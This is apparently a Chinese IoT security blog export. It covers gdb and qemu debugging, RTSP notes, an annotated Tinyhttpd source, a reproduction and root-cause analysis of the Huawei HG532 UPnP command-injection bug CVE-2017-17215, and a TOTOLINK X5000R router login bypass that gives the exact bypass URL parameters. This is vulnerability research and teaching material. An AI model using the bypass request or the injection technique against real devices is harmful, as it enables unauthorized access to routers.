关于gdb多线程调试gdb多线程调试，大概说一下怎么搞。 使用qemu自带的-g参数启动远程server qemu-arm-static -L . -g 1234 .&#x2F;opt&#x2F;app&#x2F;execute # 1234为监听的端口 使用gdb-multiarch来进行调试 gdb-multiarch opt&#x2F;app&#x2F;execute target remote 127.0.0.1 在子线程函数中下个断点，我这边位置是0x000110E8 使用c来执行程序 使用netcat连接udp nc -uvv 127.0.0.1 8899 连上后gdb中能发现新线程 info threads ID 2 就是断下来的心线程，使用thread 2来切换线程 thread 2 此时pc指向我们的断点，要回主线程，只需要再次切换即可。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"协议-rtsp","slug":"iot/协议-rtsp","date":"2022-09-21T02:15:51.000Z","updated":"2022-09-21T02:15:51.000Z","comments":true,"path":"article/ccd0d78.html","link":"","permalink":"http://example.com/article/ccd0d78.html","excerpt":"","text":"最近在看摄像头，刚好碰到rtsp协议的东西，寻思学习记录下。 这里csdn的JT同学师傅的博客写的很不错。 rtsp是一个实时传输流协议，简单点说就是用来看视频的。 rtsp通常包括rtp，rtcp，rtsp rtsp负责客户端与服务端的请求和响应 rtcp负责在RTP传输过程中提供传输信息 rtp负责传输媒体数据 rtsp承载与rtp和rtcp之上，rtsp并不会发送媒体数据，而是使用rtp协议传输 rtp并没有规定发送方式，可以选择udp发送或者tcp发送","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"协议-tinyhttpd","slug":"iot/协议-tinyhttpd","date":"2022-08-01T05:04:55.000Z","updated":"2022-08-01T05:04:55.000Z","comments":true,"path":"article/68d281b.html","link":"","permalink":"http://example.com/article/68d281b.html","excerpt":"","text":"一个非常轻量的httpd服务器，只有500行代码。 我后边用python写了一个很简陋的几十行代码的，可以看下那个来简单看一下。 这里只看了网络编程的一些东西，进程通信挖个坑，下次填。 很适合 https://github.com/EZLippi/Tinyhttpd.git 编译方式是直接make 编译执行后发现开启4000端口 默认加载htdocs下的index.html 当去访问一个不存在的文件a.html cgi问题 这里写一个简单的shell cgi来替代自带的cgi #!/bin/bash echo &quot;Content-Type: text/html&quot; echo echo &quot;&lt;HTML&gt;&lt;BODY&gt;&quot; echo &quot;&lt;CENTER&gt;Today is:&lt;/CENTER&gt;&quot; echo &quot;&lt;CENTER&gt;&lt;B&gt;&quot; date echo &quot;&lt;/B&gt;&lt;/CENTER&gt;&quot; echo &quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot; 访问cgi文件，发现cgi并未被执行 是因为没有执行权限，所以导致直接被当成静态文件，而有执行权限的话，静态文件也会被当作cgi执行。 尝试将所有的文件赋予权限 chmod 777 .&#x2F;* index页面无法正常显示 执行方式可以通过下图来理解 注释代码项目放代码阅读时的代码放gitee了需要可自行下载：https://gitee.com/p1piyang/backward-analysis/ /* J. David&#x27;s webserver */ /* This is a simple webserver. * Created November 1999 by J. David Blackstone. * CSE 4344 (Network concepts), Prof. Zeigler * University of Texas at Arlington */ /* This program compiles for Sparc Solaris 2.6. * To compile for Linux: * 1) Comment out the #include &lt;pthread.h&gt; line. * 2) Comment out the line that defines the variable newthread. * 3) Comment out the two lines that run pthread_create(). * 4) Uncomment the line that runs accept_request(). * 5) Remove -lsocket from the Makefile. */ #include &lt;stdio.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;netinet/in.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;unistd.h&gt; #include &lt;ctype.h&gt; #include &lt;strings.h&gt; #include &lt;string.h&gt; #include &lt;sys/stat.h&gt; #include &lt;pthread.h&gt; #include &lt;sys/wait.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #define ISspace(x) isspace((int)(x)) #define SERVER_STRING &quot;Server: jdbhttpd/0.1.0\\r\\n&quot; #define STDIN 0 #define STDOUT 1 #define STDERR 2 void accept_request(void *); void bad_request(int); void cat(int, FILE *); void cannot_execute(int); void error_die(const char *); void execute_cgi(int, const char *, const char *, const char *); int get_line(int, char *, int); void headers(int, const char *); void not_found(int); void serve_file(int, const char *); int startup(u_short *); void unimplemented(int); /**********************************************************************/ /* A request has caused a call to accept() on the server port to * return. Process the request appropriately. * Parameters: the socket connected to the client */ /**********************************************************************/ void accept_request(void *arg) &#123; int client = (intptr_t)arg; char buf[1024]; size_t numchars; char method[255]; char url[255]; char path[512]; size_t i, j; struct stat st; //文件信息 //struct stat&#123; // dev_t st_dev; /* ID of device containing file */文件使用的设备号 // ino_t st_ino; /* inode number */ 索引节点号 // mode_t st_mode; /* protection */ 文件对应的模式，文件，目录等 // nlink_t st_nlink; /* number of hard links */ 文件的硬连接数 // uid_t st_uid; /* user ID of owner */ 所有者用户识别号 // gid_t st_gid; /* group ID of owner */ 组识别号 // dev_t st_rdev; /* device ID (if special file) */ 设备文件的设备号 // off_t st_size; /* total size, in bytes */ 以字节为单位的文件容量 // blksize_t st_blksize; /* blocksize for file system I/O */ 包含该文件的磁盘块的大小 // blkcnt_t st_blocks; /* number of 512B blocks allocated */ 该文件所占的磁盘块 // time_t st_atime; /* time of last access */ 最后一次访问该文件的时间 // time_t st_mtime; /* time of last modification */ /最后一次修改该文件的时间 // time_t st_ctime; /* time of last status change */ 最后一次改变该文件状态的时间 //&#125;; int cgi = 0; /* becomes true if server decides this is a CGI * program */ char *query_string = NULL; //读取http请求的第一行数据 numchars = get_line(client, buf, sizeof(buf)); i = 0; j = 0; //吧请求方法存到，，method中 while (!ISspace(buf[i]) &amp;&amp; (i &lt; sizeof(method) - 1)) &#123; method[i] = buf[i]; i++; &#125; j=i; method[i] = &#x27;\\0&#x27;; //判断如果不是get或者post方法，发送response给客户端表示无法实现 if (strcasecmp(method, &quot;GET&quot;) &amp;&amp; strcasecmp(method, &quot;POST&quot;)) &#123; //使用sprintf函数将要返回的内容给buf,使用send函数返回给client unimplemented(client); return; &#125; //判断为post方法 if (strcasecmp(method, &quot;POST&quot;) == 0) cgi = 1; i = 0; //跳过空格 while (ISspace(buf[j]) &amp;&amp; (j &lt; numchars)) j++; //获取url while (!ISspace(buf[j]) &amp;&amp; (i &lt; sizeof(url) - 1) &amp;&amp; (j &lt; numchars)) &#123; url[i] = buf[j]; i++; j++; &#125; url[i] = &#x27;\\0&#x27;; //get方法 if (strcasecmp(method, &quot;GET&quot;) == 0) &#123; query_string = url; //用于记录带参数的GET方法请求中 ‘？’后的参数 while ((*query_string != &#x27;?&#x27;) &amp;&amp; (*query_string != &#x27;\\0&#x27;)) query_string++; if (*query_string == &#x27;?&#x27;) &#123; cgi = 1; *query_string = &#x27;\\0&#x27;; query_string++; &#125; &#125; //将htdocs与url拼接到一起给path，即我们的资源文件都在htdocs下 sprintf(path, &quot;htdocs%s&quot;, url); //判断如果URL的最后一位是‘/’，加上index.html if (path[strlen(path) - 1] == &#x27;/&#x27;) strcat(path, &quot;index.html&quot;); //定义函数：int stat(const char * file_name, struct stat *buf); //函数说明：stat()用来将参数file_name 所指的文件状态, 复制到参数buf 所指的结构中。 //返回值：执行成功则返回0，失败返回-1，错误代码存于errno。 //这里改了一下，把东西处理下可以看到是处理包头。 //根据执行来看，这个if判断 if (stat(path, &amp;st) == -1) &#123; while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;\\n&quot;, buf)) /* read &amp; discard headers */ &#123; numchars = get_line(client, buf, sizeof(buf)); char *test = buf; printf(&quot;for: %s&quot;, test); &#125; //打印404返回页面 not_found(client); &#125; else &#123; // 文件存在，那则跟常量S_IFMT相与，相与之后的值可以用来判断该文件是什么类型的 // 此处与上边判断路径是不是以 \\ 结尾的地方作用一样，可以省略，留着可重复确认。 if ((st.st_mode &amp; S_IFMT) == S_IFDIR) strcat(path, &quot;/index.html&quot;); //判断权限的，前面有说过的 if ((st.st_mode &amp; S_IXUSR) || (st.st_mode &amp; S_IXGRP) || (st.st_mode &amp; S_IXOTH) ) cgi = 1; if (!cgi) &#123; printf(&quot;nocgi\\n&quot;); //不需要cgi的 serve_file(client, path); &#125; else &#123; //需要cgi的 printf(&quot;cgi\\n&quot;); execute_cgi(client, path, method, query_string); &#125; &#125; close(client); &#125; /**********************************************************************/ /* Inform the client that a request it has made has a problem. * Parameters: client socket */ /**********************************************************************/ void bad_request(int client) &#123; char buf[1024]; sprintf(buf, &quot;HTTP/1.0 400 BAD REQUEST\\r\\n&quot;); send(client, buf, sizeof(buf), 0); sprintf(buf, &quot;Content-type: text/html\\r\\n&quot;); send(client, buf, sizeof(buf), 0); sprintf(buf, &quot;\\r\\n&quot;); send(client, buf, sizeof(buf), 0); sprintf(buf, &quot;&lt;P&gt;Your browser sent a bad request, &quot;); send(client, buf, sizeof(buf), 0); sprintf(buf, &quot;such as a POST without a Content-Length.\\r\\n&quot;); send(client, buf, sizeof(buf), 0); &#125; /**********************************************************************/ /* Put the entire contents of a file out on a socket. This function * is named after the UNIX &quot;cat&quot; command, because it might have been * easier just to do something like pipe, fork, and exec(&quot;cat&quot;). * Parameters: the client socket descriptor * FILE pointer for the file to cat */ /**********************************************************************/ void cat(int client, FILE *resource) &#123; char buf[1024]; //读取文件内容，发送到前端。 fgets(buf, sizeof(buf), resource); while (!feof(resource)) &#123; send(client, buf, strlen(buf), 0); fgets(buf, sizeof(buf), resource); &#125; &#125; /**********************************************************************/ /* Inform the client that a CGI script could not be executed. * Parameter: the client socket descriptor. */ /**********************************************************************/ void cannot_execute(int client) &#123; char buf[1024]; sprintf(buf, &quot;HTTP/1.0 500 Internal Server Error\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;Content-type: text/html\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;P&gt;Error prohibited CGI execution.\\r\\n&quot;); send(client, buf, strlen(buf), 0); &#125; /**********************************************************************/ /* Print out an error message with perror() (for system errors; based * on value of errno, which indicates system call errors) and exit the * program indicating an error. */ /**********************************************************************/ void error_die(const char *sc) &#123; perror(sc); exit(1); &#125; /**********************************************************************/ /* Execute a CGI script. Will need to set environment variables as * appropriate. * Parameters: client socket descriptor * path to the CGI script */ /**********************************************************************/ // cgi用于动态网页的处理 // execute_cgi函数创建了两个进程，子进程用于cgi文件的处理，父进程用于往socket读写数据 void execute_cgi(int client, const char *path, const char *method, const char *query_string) &#123; char buf[1024]; int cgi_output[2]; int cgi_input[2]; pid_t pid; int status; int i; char c; int numchars = 1; int content_length = -1; buf[0] = &#x27;A&#x27;; buf[1] = &#x27;\\0&#x27;; printf(&quot;&gt;exec cgi\\n&quot;); //get方法 if (strcasecmp(method, &quot;GET&quot;) == 0) while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;\\n&quot;, buf)) /* read &amp; discard headers */ &#123; printf(&quot;&gt;get\\n&quot;); numchars = get_line(client, buf, sizeof(buf)); &#125; //post方法 else if (strcasecmp(method, &quot;POST&quot;) == 0) /*POST*/ &#123; numchars = get_line(client, buf, sizeof(buf)); while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;\\n&quot;, buf)) &#123; // &quot;Content-Length:&quot;长度为15个字符，所以将前15个字符比较。 buf[15] = &#x27;\\0&#x27;; // 如果是Content-Length，读取这个改字段转为整数 if (strcasecmp(buf, &quot;Content-Length:&quot;) == 0) &#123; content_length = atoi(&amp;(buf[16])); printf(&quot;lenght:%d\\n&quot;,content_length); &#125; numchars = get_line(client, buf, sizeof(buf)); &#125; //无法处理的话，400错误 if (content_length == -1) &#123; bad_request(client); return; &#125; &#125; else/*HEAD or other*/ &#123; &#125; //创建管道 //子进程写管道 if (pipe(cgi_output) &lt; 0) &#123; //服务错误500 cannot_execute(client); return; &#125; //子进程写管道 if (pipe(cgi_input) &lt; 0) &#123; //服务错误500 cannot_execute(client); return; &#125; //创建子进程 if ( (pid = fork()) &lt; 0 ) &#123; cannot_execute(client); return; &#125; //响应成功 sprintf(buf, &quot;HTTP/1.0 200 OK\\r\\n&quot;); send(client, buf, strlen(buf), 0); // 这下面是另一个坑，进程通信。 if (pid == 0) /* child: CGI script */ &#123; char meth_env[255]; char query_env[255]; char length_env[255]; dup2(cgi_output[1], STDOUT); dup2(cgi_input[0], STDIN); close(cgi_output[0]); close(cgi_input[1]); sprintf(meth_env, &quot;REQUEST_METHOD=%s&quot;, method); putenv(meth_env); if (strcasecmp(method, &quot;GET&quot;) == 0) &#123; sprintf(query_env, &quot;QUERY_STRING=%s&quot;, query_string); putenv(query_env); &#125; else &#123; /* POST */ sprintf(length_env, &quot;CONTENT_LENGTH=%d&quot;, content_length); putenv(length_env); &#125; execl(path, NULL); exit(0); &#125; else &#123; /* parent */ close(cgi_output[1]); close(cgi_input[0]); if (strcasecmp(method, &quot;POST&quot;) == 0) for (i = 0; i &lt; content_length; i++) &#123; recv(client, &amp;c, 1, 0); write(cgi_input[1], &amp;c, 1); &#125; while (read(cgi_output[0], &amp;c, 1) &gt; 0) send(client, &amp;c, 1, 0); close(cgi_output[0]); close(cgi_input[1]); waitpid(pid, &amp;status, 0); &#125; &#125; /**********************************************************************/ /* Get a line from a socket, whether the line ends in a newline, * carriage return, or a CRLF combination. Terminates the string read * with a null character. If no newline indicator is found before the * end of the buffer, the string is terminated with a null. If any of * the above three line terminators is read, the last character of the * string will be a linefeed and the string will be terminated with a * null character. * Parameters: the socket descriptor * the buffer to save the data in * the size of the buffer * Returns: the number of bytes stored (excluding null) */ /**********************************************************************/ //处理包，大概流程是循环读取每个字符 //如果回车符(\\r)的后面不是换行符(\\n)或者读取失败就把当前读取的字符置为换行，从而终止循环 //如果没有成功接收到字符，以 \\n 结尾，结束循环 //最后以\\n结尾 int get_line(int sock, char *buf, int size) &#123; int i = 0; char c = &#x27;\\0&#x27;; int n; // while ((i &lt; size - 1) &amp;&amp; (c != &#x27;\\n&#x27;)) &#123; n = recv(sock, &amp;c, 1, 0); /* DEBUG printf(&quot;%02X\\n&quot;, c); */ if (n &gt; 0) &#123; if (c == &#x27;\\r&#x27;) &#123; n = recv(sock, &amp;c, 1, MSG_PEEK); /* DEBUG printf(&quot;%02X\\n&quot;, c); */ if ((n &gt; 0) &amp;&amp; (c == &#x27;\\n&#x27;)) recv(sock, &amp;c, 1, 0); else c = &#x27;\\n&#x27;; &#125; buf[i] = c; i++; &#125; else c = &#x27;\\n&#x27;; &#125; buf[i] = &#x27;\\0&#x27;; return(i); &#125; /**********************************************************************/ /* Return the informational HTTP headers about a file. */ /* Parameters: the socket to print the headers on * the name of the file */ /**********************************************************************/ //响应头 void headers(int client, const char *filename) &#123; char buf[1024]; (void)filename; /* could use filename to determine file type */ strcpy(buf, &quot;HTTP/1.0 200 OK\\r\\n&quot;); send(client, buf, strlen(buf), 0); strcpy(buf, SERVER_STRING); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;Content-Type: text/html\\r\\n&quot;); send(client, buf, strlen(buf), 0); strcpy(buf, &quot;\\r\\n&quot;); send(client, buf, strlen(buf), 0); &#125; /**********************************************************************/ /* Give a client a 404 not found status message. */ /**********************************************************************/ void not_found(int client) &#123; //将内容打印到缓存，并且发送出去 char buf[1024]; sprintf(buf, &quot;HTTP/1.0 404 NOT FOUND\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, SERVER_STRING); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;Content-Type: text/html\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;HTML&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;BODY&gt;&lt;P&gt;The server could not fulfill\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;your request because the resource specified\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;is unavailable or nonexistent.\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;/BODY&gt;&lt;/HTML&gt;\\r\\n&quot;); send(client, buf, strlen(buf), 0); &#125; /**********************************************************************/ /* Send a regular file to the client. Use headers, and report * errors to client if they occur. * Parameters: a pointer to a file structure produced from the socket * file descriptor * the name of the file to serve */ /**********************************************************************/ void serve_file(int client, const char *filename) &#123; FILE *resource = NULL; int numchars = 1; char buf[1024]; buf[0] = &#x27;A&#x27;; buf[1] = &#x27;\\0&#x27;; while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;\\n&quot;, buf)) /* read &amp; discard headers */ numchars = get_line(client, buf, sizeof(buf)); //打开文件，判断是否有文件 resource = fopen(filename, &quot;r&quot;); if (resource == NULL) not_found(client); else &#123; //构造响应头给客户端 headers(client, filename); //将文件内容发送给客户端 cat(client, resource); &#125; fclose(resource); &#125; /**********************************************************************/ /* This function starts the process of listening for web connections * on a specified port. If the port is 0, then dynamically allocate a * port and modify the original port variable to reflect the actual * port. * Parameters: pointer to variable containing the port to connect on * Returns: the socket */ /**********************************************************************/ //初始化 httpd 服务，包括建立套接字，绑定端口，进行监听等。 int startup(u_short *port) &#123; int httpd = 0; int on = 1; struct sockaddr_in name; //正常的socket创建流程 httpd = socket(PF_INET, SOCK_STREAM, 0); if (httpd == -1) error_die(&quot;socket&quot;); memset(&amp;name, 0, sizeof(name)); name.sin_family = AF_INET; name.sin_port = htons(*port); name.sin_addr.s_addr = htonl(INADDR_ANY); //setsockopt()函数，用于任意类型、任意状态套接口的设置选项值 if ((setsockopt(httpd, SOL_SOCKET, SO_REUSEADDR, &amp;on, sizeof(on))) &lt; 0) &#123; error_die(&quot;setsockopt failed&quot;); &#125; //绑定socket到端口，port等于0，系统会随机分配一个端口（bind函数里实现） if (bind(httpd, (struct sockaddr *)&amp;name, sizeof(name)) &lt; 0) error_die(&quot;bind&quot;); // 这个if的作用是将自动分配的端口传给port if (*port == 0) /* if dynamically allocating a port */ &#123; socklen_t namelen = sizeof(name); // 获取socket绑定的地址信息 if (getsockname(httpd, (struct sockaddr *)&amp;name, &amp;namelen) == -1) error_die(&quot;getsockname&quot;); *port = ntohs(name.sin_port); &#125; //监听端口 if (listen(httpd, 5) &lt; 0) error_die(&quot;listen&quot;); return(httpd); &#125; /**********************************************************************/ /* Inform the client that the requested web method has not been * implemented. * Parameter: the client socket */ /**********************************************************************/ void unimplemented(int client) &#123; char buf[1024]; sprintf(buf, &quot;HTTP/1.0 501 guan zhu jia ran, dun dun jie chan\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, SERVER_STRING); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;Content-Type: text/html\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Method Not Implemented\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;/TITLE&gt;&lt;/HEAD&gt;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;BODY&gt;&lt;P&gt;if you watch this page, please follow JiaRan_Diana.\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;br/&gt;&lt;img src=&#x27;https://img2.baidu.com/it/u=2323296913,2613522307&amp;amp;fm=253&amp;amp;app=138&amp;amp;size=w931&amp;amp;n=0&amp;amp;f=JPEG&amp;amp;fmt=auto?sec=1658854800&amp;amp;t=7b90c5387e83fb57a89e051eccbb7eb9&#x27;&gt;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;/BODY&gt;&lt;/HTML&gt;\\r\\n&quot;); send(client, buf, strlen(buf), 0); &#125; /**********************************************************************/ int main(void) &#123; int server_sock = -1; //服务端套接字接口 u_short port = 4000; //端口 int client_sock = -1;//已连接套接字描述符，初始化为-1（客户端） struct sockaddr_in client_name; socklen_t client_name_len = sizeof(client_name); pthread_t newthread; //调用startup()函数，建立一个监听套接字，在对应的端口建立httpd服务 server_sock = startup(&amp;port); printf(&quot;httpd running on port %d\\n&quot;, port); //循环调用accept()函数来等待客户端的连接，accept()会议阻塞的方式运行 //有客户端链接后返回到client_sock，去创建新线程处理请求 while (1) &#123; client_sock = accept(server_sock, (struct sockaddr *)&amp;client_name, &amp;client_name_len); if (client_sock == -1) error_die(&quot;accept&quot;); //创建新线程用accept_request()函数处理新请求，同时将客户端socket作为参数传过去 /* accept_request(&amp;client_sock); */ if (pthread_create(&amp;newthread , NULL, (void *)accept_request, (void *)(intptr_t)client_sock) != 0) perror(&quot;pthread_create&quot;); &#125; close(server_sock); return(0); &#125;","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"CVE-2017-17215(华为HG532远程命令执行漏洞)","slug":"iot/CVE-2017-17215","date":"2022-07-20T09:57:32.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/3a44f1fa.html","link":"","permalink":"http://example.com/article/3a44f1fa.html","excerpt":"","text":"固件和exp都已经放在这个地方了：https://gitee.com/p1piyang/backward-analysis/tree/master/ 建议先通一遍文章再动手复现，复现之前一定要保存虚拟机快照，防止出现各种奇奇怪怪的问题 首先要解决环境问题，这里只做配置说明，iot分析环境专门有一篇，请去看IOT固件分析环境搭建 的binwalk，qemu 解压固件直接使用binwalk -Me HG532eV100R001C02B015_upgrade_main.bin命令来直接解压固件文件 解压完成后，在固件同文件夹下可以看到解压出来的文件夹 文件夹中的squashfs-root就是我们需要的文件系统了，如果squashfs-root中没有下图的各种文件系统，就是你的binwalk有不完整，去看iot固件分析环境搭建 配置网络我们要让qemu虚拟机和我们的ubuntu互通。 安装网络配置工具 apt-get install bridge-utils uml-utilities 修改ubuntu网络配置文件 /etc/network/interfaces/sudo vim 你一定会把！ 内容改成如下，图下提供了复制粘贴的代码（贴心人） # interfaces(5) file used by ifup(8) and ifdown(8) auto lo iface lo inet loopback auto ens33 iface ens33 inet manual up ifconfig ens33 0.0.0.0 up auto br0 iface br0 inet dhcp bridge_ports ens33 bridge_maxwait 0 创建或修改qemu的网络接口启动文件脚本/etc/qemu-ifup如果没有这个文件直接创建就可以了，如果有的话将里边内容清空，然后写入下面脚本 #!/bin/sh # Script to bring a network (tap) device for qemu up. # The idea is to add the tap device to the same bridge # as we have default routing to. # in order to be able to find brctl echo &quot;Executing /etc/qemu-ifup&quot; echo &quot;Bringing $1 for bridge mode...&quot; sudo /sbin/ifconfig $1 0.0.0.0 promisc up echo &quot;Adding $1 to br0...&quot; sudo /sbin/brctl addif br0 $1 sleep 3 然后依次执行如下操作 #启动桥接网络赋予可执行权限 sudo chmod a+x /etc/qemu-ifup #重启网络服务，使配置生效（注意这个地方配置正常之后，如果你是mac，可能会让你输入mac密码，windows我不知道😬） sudo /etc/init.d/networking restart #关闭ens33，启动桥接网络br0（这里如果显示eth0不存在没关系，直接启动br0） sudo ifdown eth0 sudo ifup br0 如图所示，当前网卡为br0 配置完之后，如果下面qemu虚拟机配置之后，仍然无法获取ip，重启ubuntu 配置qemu虚拟机先去下载debian-mips-qemu镜像文件，每次固件分析要注意对应大小端序的镜像文件（还是有设备的好😭） 下载地址：https://people.debian.org/~aurel32/qemu/mips/ 我们需要红框里的两个文件，然后在文件所在地方启动qemu 这里特别说明，最后一个参数-nographic带上是在终端中直接运行，不会弹出窗口运行，建议一定不要开，我这里开了之后这个窗口的返回快捷键和vmware的一模一样，就导致我只能在mac和qemu中间用，我回不去我的ubuntu了。 sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap -nographic 如果你的多次运行qemu，可能会出现如下错误 这是服务没有退出导致的 ps查出当前qemu进程号，kill掉就好了 ps -e | grep ‘qemu’ sudo kill 3307 即可 启动如上图，账号密码都是root 启动后尝试，ping baidu.com 和 ubuntu 如果不通 ifconfig -a 查看网卡第一个是什么，一般都会是eth1 然后修改/etc/network/interfaces，注意这里是在qemu虚拟机中修改 nano /etc/network/interfaces 第一次配置红框中一般是eth0，将红框中的内容修改为你的网卡名字 保存后使用下面指令重启eth1 ifup eth1 再次尝试，如果还不行或者ifconfig发现eth1没有分配地址，重启ubuntu或者找原因🤔，不行就恢复快照 如果成了的话是可以用ssh远程连接qemu虚拟机的 ssh root@虚拟机ip 建议在ubuntu中使用ssh连接，比较方便 接下来将我们解压出来的文件系统拷贝到qemu scp -r ./squashfs-root root@虚拟机ip:/root/ 复现通过checkpoint报告中能看到关键字为ctrl和Deviceupgrade，端口号为37215 使用grep来查找 两个都指向upnp这个文件，端口号指向mic这个文件 直接运行会出问题，我们切换根目录到拷贝进来的系统文件中 chroot /root/squashfs-root /bin/sh 然后先后运行upnp和mic 到这个地方mic已经运行成功了，放着不用管他了 使用lsof -i:37215可以查看端口是否运行 用下面命令来查看是否启动成功 nc -vv 192.168.150.9 37215 成功了就可以跑exp了 与checkpoint不同的是，我把溢出的命令修改了（红框处，这里就是灵活使用了），蓝框处修改为qemu的ip 执行exp后 在mic界面可以看到 ls被成功执行了。 原因分析Ida7.5可以反编译qemu🥳 通过exp能发现，命令行放在了NewStatusURL标签下，在ida中通过字符串查找 49c的位置使用快捷间p可以创建函数，来反编译 snprintf函数将可变个参数按照format格式化成字符串，然后将其复制到str中，即把v5与前面字符串拼接放到v6中，并且system执行了v6 根据exp的执行效果来推测，ATP_XML_GetChildNodeByName这个函数读取NewStatusURL标签的内容放到了v5。 伪代码不可信，尽量还是通过汇编代码分析 倒推能发现，system的参数为0x42C+var_414($sp) 0x42C+var_414($sp)为snprintf 的第一个参数，0x42C+var_40C($sp)为snprintf的第四个参数 即 0x42C+var_40C($sp)的内容通过函数放到了0x42C+var_414($sp) 而0x42C+var_40C($sp)为ATP_XML_GetChildNodeByName的一个参数，这里应该是读取后放到了0x42C+var_40C($sp) ida的锅🙃，没有办法ATP_XML_GetChildNodeByName做具体分析，但通过网上一些师傅的文章，应该大差不差了 然后了解原理我们就可以通过闭合来实现命令运行了。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"totolink后台登录绕过","slug":"iot/TOTOLINK后台登录绕过","date":"2022-07-20T09:57:32.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/b3e9da69.html","link":"","permalink":"http://example.com/article/b3e9da69.html","excerpt":"","text":"型号：X5000R AX1800 无线双频千兆路由器 下面有分析思路，设备模拟过程比较靠近新手，师傅们可以直接跳到后面分析过程。 漏洞 登陆页面构造参数，无需密码 formLoginAuth.htm?authCode&#x3D;1&amp;action&#x3D;login 可直接绕过登陆，进入后台 产生原因在lighttpd wen服务文件from_login函数中 if (iVar2 == 0) &#123; iVar1 = strcmp((char *)&amp;sa58,&quot;ie8&quot;); if (iVar1 == 0) &#123; pcVar1 = &quot;/login_ie.html&quot;; &#125; else &#123; iVar1 = atoi((char *)&amp;sa58); if (iVar1 == 1) &#123; ​ pcVar2 = &quot;/login.html&quot;; ​ pcVar1 = &quot;http://%s%s%s&quot;; ​ pcVar3 = &quot;/phone&quot;; LAB_409114: ​ sprintf(param_2,pcVar1,acStack1860,pcVar3,pcVar2); ​ return 1; &#125; pcVar1 = &quot;/login.html&quot;; &#125; sprintf(param_2,&quot;http://%s%s&quot;,acStack1860,pcVar1); return 1; &#125; 上面代码是登陆检查，当iVar2&#x3D;1的时候，直接跳过检查，不需要登陆。 iVar2的值是autoCode参数的值。 所以构造autoCode&#x3D;1即可绕过。 模拟下面是详细分析思路。 今天偶然发现这款非常小众的路由器，至于多小众，我分析这款官方月销15台。 我分析的这款是 AX1800，官方可以直接下载固件。 这款固件超级适合新手第一次分析使用。 binwalk分析 binwalk TOTOLINK_C8343R-1C_X5000R_IP04433_MT7621A_SPI_16M256M_V9.1.0u.6118_B20201102_ALL.web squashfs文件系统，uImage，LZMA压缩文件中应该也是个比较大的内容，直接使用-Me参数递归提取。 binwalk -Me TOTOLINK_C8343R-1C_X5000R_IP04433_MT7621A_SPI_16M256M_V9.1.0u.6118_B20201102_ALL.web 里面有标准的文件系统 查看架构 binwalk ./bin/busybox mips小端序，查看其文件系统瞅瞅有没有什么东西。 有个工具叫firmwalker，可以自动分析文件系统，提取重要文件，我个人觉得不是特别好用。 我比较推荐使用vscode来做分析。 下面是要关注的一些地方 etc/ #这里会存放系统启动文件如openwrt的rcS文件 sbin/ #这里一般会存放厂商制作的功能性文件和提供web服务的文件 www/ #这里会存放一些web静态页面和后台服务文件文件 其他地方也尽量看一下，经验多了就容易清楚哪些文件是做什么的了，没经验就慢慢来。 这里发现了这几个文件： 可以看到他使用了lighttpd 的web服务文件， 一般固件大概会有这几个轻量级httpd文件：lighttpd，httpd，uhppd。 其他的还有很多。 尝试使用qemu-user模拟http服务。 cp (which qemu-mipsel-static) ./ sudo chroot . ./qemu-mipsel-static ./usr/sbin/lighttpd 这里的报错是需要用-f参数指定配置文件，上面已经发现了lighttpd.conf文件。 sudo chroot . ./qemu-mipsel-static ./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf 没有这个文件，这里我们先去把这个路径改一下，在lighttpd.conf中 把它改到固件的系统文件中./var/run/lighttpd.pid，并且去创建这个文件。 运行 